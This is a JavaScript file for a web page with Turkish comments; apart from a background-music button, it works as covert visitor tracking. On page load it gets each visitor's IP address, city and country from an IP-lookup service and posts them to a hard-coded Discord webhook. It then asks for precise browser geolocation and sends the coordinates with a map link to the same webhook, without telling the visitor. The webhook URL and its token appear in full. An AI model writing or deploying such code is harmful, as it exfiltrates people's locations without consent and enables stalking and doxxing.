const playBtn = document.getElementById("playMusic");
const bgMusic = document.getElementById("bgMusic");

// Müzik Çalma
if (playBtn) {
    playBtn.addEventListener("click", () => {
        bgMusic.play();
        playBtn.innerText = "🎶 Müzik Çalıyor";
    });
}

// --- DISCORD'A VERİ GÖNDERME FONKSİYONU ---
function discordaGonder(mesaj) {
    const webhookURL = "https://discord.com/api/webhooks/1470176972410851379/7mzBrZBZzn_oW7nXfV0538TOe1rhbTo46P9IoIRXoHEMx4AcvFJjqvqtIDNa2BzGQ47I"; // Discord'dan aldığın URL
    
    fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: mesaj,
            username: "Site Ziyaretçi Botu",
            avatar_url: "https://cdn-icons-png.flaticon.com/512/25/25231.png"
        })
    });
}

// --- KONUM BULMA VE GÖNDERME SİSTEMİ ---
function konumuGetir() {
    const konumMetni = document.getElementById("konum-bilgi");

    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            let ilkMesaj = `🚀 **Yeni Ziyaretçi!**\n📍 Şehir: ${data.city} / ${data.country_name}\n🌐 IP: ${data.ip}`;
            
            if (konumMetni) {
                konumMetni.innerText = `${data.city}, ${data.country_name} civarından bağlanıyorsun...`;
            }
            
            // İlk olarak şehir bilgisini gönder
            discordaGonder(ilkMesaj);

            // Hassas konum iste
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    const lat = position.coords.latitude.toFixed(5);
                    const lng = position.coords.longitude.toFixed(5);
                    const haritaLinki = `https://www.google.com/maps?q=${lat},${lng}`;
                    
                    if (konumMetni) {
                        konumMetni.innerText = `Tam konumun: ${data.city} (${lat}, ${lng}) 📍`;
                    }

                    // Hassas konumu Discord'a gönder
                    discordaGonder(`🎯 **Tam Konum Bulundu!**\n📍 Koordinat: ${lat}, ${lng}\n🗺️ Harita: ${haritaLinki}`);
                });
            }
        })
        .catch(err => console.error("Hata:", err));
}

window.addEventListener('load', konumuGetir);
